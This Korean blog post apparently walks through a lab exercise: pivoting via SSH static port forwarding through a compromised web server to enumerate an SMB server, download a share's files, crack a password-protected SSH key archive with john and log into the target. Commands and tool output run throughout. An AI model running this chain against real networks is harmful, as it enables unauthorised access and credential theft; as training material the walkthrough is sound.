---
layout: post
title: 정적 포트포워딩을 이용한 공격
subtitle: Static port forwarding을 이용하여 타겟단말의 정보 취득
category: knowledge
thumbnail-img: /assets/img/knowledge/port.png
tags: [knowledge, portforwarding, smb, smbclient, rpcclient, john]
author: Hong
---
# 시나리오
![port](/assets/img/knowledge/port.png)
최종목표를 SMB서버에 접속해서 파일을 확인하고 다운로드하는 것으로 했을 때,

현재 나의 IP주소는 타겟서버와 네트워크 범위가 달라서 접속이 불가능한 상황.

이때 VPN 접속 후 ssh로 접속이 가능한 웹서버가 타겟서버와 같은 네트워크에 놓여있다. (웹서버는 이미 공략되어진 상태)

하지만 웹서버에는 기본적인 프로그램들이 설치되어있지않고, 권한도 일반 유저권한이기 때문에 직접적으로 타겟서버의 확인이 불가능한 상태.

이때 정적포트포워딩을 통해서 내 단말에서 웹서버를 경유해 타겟머신으로의 조작을 실행하는 것이 목표.
# ssh를 이용한 정적 포트 포워딩 설정
우선 내 단말에서 웹서버를 경유해서 최종 목적지인 smb서버에 도달할 수 있도록 설정한다.

`ssh -L 8080:10.100.23.3:445 www-data@10.30.23.100`

`ssh -L <내가 설정할 포트>:<최종 타겟의 IP주소>:<이용할 타겟의 포트번호> <경유머신의 유저명@IP주소>`

참고로 ssh접속 시 매번 비밀번호를 입력하는게 귀찮아서 웹서버에 내 단말의 공개키를 배치해놓은 상태.

위의 명령어로 포트포워딩을 설정할 수 있다. 실행하면 멋대로 경유머신에 ssh접속하게 된다.
![ssh](/assets/img/knowledge/staticportforwarding.png)
이게 싫을 경우 `ssh -N` 옵션을 붙이면 쉘에 ssh접속 쉘이 나타나지않고 작동하게 된다.

# 포트포워딩 테스트
설정이 잘 되었는지 확인하기 위해 나의 로컬 단말에서 타겟머신을 스캔해보자.
```
nmap -sC -sV localhost
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-02 11:23 JST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.0015s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 9.6p1 Debian 3 (protocol 2.0)
| ssh-hostkey:
|   256 03:b2:cf:44:73:2f:fa:24:27:0a:18:eb:6a:a9:96:53 (ECDSA)
|_  256 bb:23:f4:fe:d0:be:26:02:f5:27:1f:dd:77:d5:9a:f5 (ED25519)
80/tcp   open  http        nginx 1.27.1
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.27.1
8080/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
로컬호스트로 nmap 스캔을 하면 포트포워딩 설정에 인해서 8080번 포트에서 smb서버 머신이 스캔된다. 

nmap 결과의 8080번 포트를보면 포트포워딩때 설정한 타겟머신의 445번 포트로 인식되어서 samba가 스캔된 것을 알 수 있다.
 
결과를 보아하니 제대로 포워딩 되고 있는 것 같다.
# smb서버 탐색
포트포워딩 확인하는 부분까지만 다루고 끝내려고 했으나 아쉬우니 내 단말에서 타겟머신을 탐색하는 부분도 기재.

명령어는 기본적으로 타겟머신의 IP주소 대신 **로컬호스트**를 사용하면 되고 포트는 내가 지정한 (이 포스팅의 경우 8080)번호를 사용하면 타겟머신의 445 포트번호로 작동한다.

## rpcclient
우선 rpcclient로 share와 유저 정보를 파악해보자.

rpcclient의 경우 파일을 확인하거나 다운받거나 할 수는 없지만 smb 서버의 구성을 확인할 때 굉장히 유용하다.

`rpcclient -U "%" localhost -p 8080` 

```
rpcclient $> srvinfo
        MIHARISAMBA    Wk Sv PrQ Unx NT SNT Mihari samba
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03
```
미하리라는 곳의 삼바서버.
```
rpcclient $> enumdomains
name:[MIHARISAMBA] idx:[0x0]
name:[Builtin] idx:[0x1]
```
도메인 리스트

`enumdomusers`로 유저 정보를 보려했으나 아무 정보도 없었다.

```
rpcclient $> querydominfo
Domain:         WORKGROUP
Server:         MIHARISAMBA
Comment:        Mihari samba
Total Users:    0
Total Groups:   0
Total Aliases:  0
Sequence No:    1727837025
Force Logoff:   -1
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1
```
도메인 정보
```
rpcclient $> netshareenumall
netname: public
        remark:
        path:   C:\samba\share\
        password:
netname: executive
        remark: Top secret information
        path:   C:\data
        password:
netname: IPC$
        remark: IPC Service (Mihari samba)
        path:   C:\tmp
        password:
```
공유폴더의 리스트.

IPC는 디폴트로 있는 폴더. public과 executive가 궁금하다.
```
rpcclient $> netsharegetinfo public
netname: public
        remark:
        path:   C:\samba\share\
        password:
        type:   0x0
        perms:  0
        max_uses:       -1
        num_uses:       1
revision: 1
type: 0x8004: SEC_DESC_DACL_PRESENT SEC_DESC_SELF_RELATIVE
DACL
        ACL     Num ACEs:       1       revision:       2
        ---
        ACE
                type: ACCESS ALLOWED (0) flags: 0x00
                Specific bits: 0x1ff
                Permissions: 0x1f01ff: SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS
                SID: S-1-1-0
```
public폴더의 상세정보.

꽤 많은 권한이 부여되어있다.
```
rpcclient $> netsharegetinfo executive
netname: executive
        remark: Top secret information
        path:   C:\data
        password:
        type:   0x0
        perms:  0
        max_uses:       -1
        num_uses:       1
revision: 1
type: 0x8004: SEC_DESC_DACL_PRESENT SEC_DESC_SELF_RELATIVE
DACL
        ACL     Num ACEs:       1       revision:       2
        ---
        ACE
                type: ACCESS ALLOWED (0) flags: 0x00
                Specific bits: 0x1ff
                Permissions: 0x1f01ff: SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS
                SID: S-1-1-0
```
여기까지 알아냈으면 충분한 것 같다.

이제 직접 폴더에 접속해서 내용물을 확인해보자.
## smbclient
위와 마찬가지로 로컬머신에서 smbclient로 타겟머신에 접속한다.

(중계서버에는 rpcclient도 smbclient도 nmap도 아무것도 없었기 때문에 포트포워딩이 얼마나 간편한지 다시 느낀다.)
```
smbclient //localhost/executive -p 8080
Password for [WORKGROUP\kali]:
tree connect failed: NT_STATUS_BAD_NETWORK_NAME
```
executive폴더 먼저 확인해보려 했으나 비밀번호를 모르기 때문에 접속실패.
```
smbclient //localhost/public -p 8080
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \>
```
public폴더의 경우 이름에서 알 수 있듯이 비밀번호 없어도 접속 가능했다.
```
smb: \> ls
  .                                   D        0  Tue Sep 10 19:07:00 2024
  ..                                  D        0  Tue Sep 10 19:06:57 2024
  Sales                               D        0  Tue Sep 10 19:07:02 2024
  Procurement                         D        0  Tue Sep 10 19:07:02 2024
  Legal                               D        0  Tue Sep 10 19:07:02 2024
  Finance                             D        0  Tue Sep 10 19:06:59 2024
  Information_System                  D        0  Tue Sep 10 19:07:01 2024
  Development                         D        0  Tue Sep 10 19:07:01 2024
```
여러가지 폴더들이 있어서 하나하나 내용을 확인해봤다.
```
smb: \Information_System\Setup\> ls
  .                                   D        0  Tue Sep 10 19:07:01 2024
  ..                                  D        0  Tue Sep 10 19:07:01 2024
  tmp                                 D        0  Tue Sep 10 19:07:00 2024
  ssh_key.zip                         N     3621  Fri Aug 23 18:39:46 2024
```
위의 디렉토리에서 ssh키의 zip파일을 발견했다!
```
smb: \Information_System\> ls
  .                                   D        0  Tue Sep 10 19:07:01 2024
  ..                                  D        0  Tue Sep 10 19:07:00 2024
  Setup                               D        0  Tue Sep 10 19:07:01 2024
  docs                                D        0  Tue Sep 10 19:07:01 2024
  サーバメンテナンス手順書.txt      N     1025  Wed Sep  4 14:41:03 2024
  システム障害対応マニュアル.txt      N      474  Fri Aug 23 18:39:46 2024
```
위의 파일들 중 거버넌스유지순서라는 파일이 있기 때문에 다운로드해보자

`get サーバメンテナンス手順書.txt`

그럼 내 로컬머신에 위의 파일이 다운로드 된것을 알 수 있다.

내용을 확인해보면 다음과 같이 유저이름이 적혀있다.

```
サーバメンテナンス手順書

0.事前準備
   - （！！）ZIP化されたssh鍵(ユーザ名:mihari)をローカル環境へダウンロードして、公開鍵認証でのsshアクセスの準備をすること（！！）

1. 定期メンテナンススケジュール
   - 月次メンテナンス: 毎月第1月曜日 午前2時～午前4時
   - 四半期メンテナンス: 3月、6月、9月、12月の第2週末

2. メンテナンス手順
   - 事前準備: メンテナンス通知の送信、バックアップの実施
   - サーバ停止: サーバ停止コマンドの実行
   - ハードウェアチェック: ディスク、メモリ、CPUの状態確認
   - OSおよびソフトウェアのアップデート: 最新パッチの適用

3. メンテナンス後の確認
   - サーバ再起動: 正常に再起動するか確認
   - サービス稼働確認: 各サービスが正常に稼働しているか確認
   - ログ確認: エラーログが出力されていないか確認
```
mihari가 유저명인 것 같으니 아까 있던 ssh키 파일을 압축풀기해서 사용하면 접속 가능할 것 같다.
# john을 이용한 비밀번호 찾기
ssh_key.zip을 unzip하려했는데.. 아니 이게 왠걸

```
unzip ssh_key.zip
Archive:  ssh_key.zip
[ssh_key.zip] ssh_key/id_rsa password:
```
비밀번호로 잠겨있는 파일이었다!

아까 smb폴더들을 다 봤지만 비밀번호에 관한 정보는 없었다.

직접 찾아내야 할 것 같다.

이때 자주 사용하는게 john이라는 툴이다.

우선 zip파일을 해쉬화해서 john이 사용할 수 있게 만들어줘야 한다.

`zip2john ssh_key.zip > john.txt`

(zip말고도 다양한 확장자에도 사용할 수 있다.)

그럼 아래와 같은 내용을 가진 파일이 만들어진다.
```
cat john.txt
ssh_key.zip:$pkzip$2*1*1*0*8*24*7678*903f39afe427e31af1d72b6ff86831640c89d434d81f1c066ee66a190a17ef1cc5949bfb*2*0*268*2f0*14d4ab1f*a51*4c*8*268*7678*bd130b53a0b55dc690b12ce0d70a2a28952eaced7c0140a0385e27f60aa9de8136b76f8fe803e1bfa77e435d8cfa6fdea65e0152fe1a408b5f7ae8514c30b24c0f23d791b9a1c0163530b2536b45ae1c87e6406118ab1f17e9ef4f40bf55d1a60f0f186e15dc56f6f349766f06f128c0af49b850d232e07b3cdaff279a3cdd3768394c09f024dc65ab9cec4d6b7a884944a9f38a190174847693e851b9d9f35d0b2d5ad508871a765be553840846ec64935256dfde68bc1ae38d635f6ff75da49d8b1d44c1012041b4d7b883518bed7addfa57e4112e272ff0d26946a0d91da25b91a29b7d7c281c265a253f25793d90520ea10fad24f29214de8a0a4008a907d4d0849a70cae80eccff05519f1b911ebc9dbce33ea1063cd6d33a3c3194746ca1b7b4fd9ee52c022948a50a21b486a54060a7472d2b6fc50b4c48c6fd3489dd9688a408569942665b74e68f17bcd052d89daecf58addc528a2b0919d18718678ab5038962729a8cb444b722b0b13a3e74b20be9d49f5d8d176aeba092e30fcbc169971b2196c84bb10b1dc2b47acb77622b669b01b5e12a8b924e70bd2a1704aca37a7a9e28032e95d3c59e3c6088863a6edc0f4b27bb3f65c5a57def312b2f845cb5940d34e576e56da38886f6d2cff1a6341ec9f535b454de4c09d2f04c4bbcee88fd1b279a7bf4b1ae5e4bfbdb86a92b3918320195e13dc0d44c2e59246cc0e6fd9f58b0a0300a2f95918eecaaf23c9891bca6a465f713e5edebf17367682b6f62502855d2d5d98f61f6ab64307f8c7a623fa44854225322725299f909ec77e936c9bf397a9d8784f72d986309b6b53c1b6f84b19ee4a507afa34633ca25562968a4b5ea6bd6*$/pkzip$::ssh_key.zip:ssh_key/id_rsa.pub, ssh_key/id_rsa:ssh_key.zip
```
이제 이 파일을 john을 이용해서 브루트포스 해준다.
```
john --wordlist=/usr/share/wordlists/rockyou.txt john.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
abc123           (ssh_key.zip)
1g 0:00:00:00 DONE (2024-10-01 15:49) 12.50g/s 51200p/s 51200c/s 51200C/s 123456..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
제공한 리스트에 비밀번호가 있는 경우 찾아진다.

이것으로 ssh키까지 획득했다!
# 타켓머신에 접속

이제 같은 네트워크 안에 있는 웹서버(중계서버)에서 smb머신으로 ssh공개키를 이용하여 접속한다.

scp를 이용하여 로컬머신에서 웹서버로 공개키를 옮겼다.
```
ssh mihari@10.100.23.3 -i id_rsa
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <http://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

1bf0e9f1bcab:~$ whoami
mihari
```
이로써 타켓머신에 침입성공!

# 정리
이로써 시나리오대로 네트워크가 다른 로컬머신에서 타겟머신과 같은 네트워크에 있던 웹서버를 이용하여 포트포워딩을 사용해 타겟머신에 침입하는 것 까지 실시했다.

이번에 사용한 포트포워딩은 445번 포트를 고정해놓은 **정적 포트포워딩**이다.

혹시 타겟머신의 여러가지 포트번호를 이용해야 할 경우 매번 설정하기가 번거로울 수 있다.

그럴 경우에는 동적 포트포워딩이라는 것을 사용하면 되지않을까 싶다. (아직 해본적은 없다.)

아니면 -L 옵션을 여러번 사용해서 다중으로 지정하는 방법도 있다고 한다.

`ssh -L 8080:10.100.23.3:22 -L 8081:10.100.23.3:80 user@10.30.23.100`
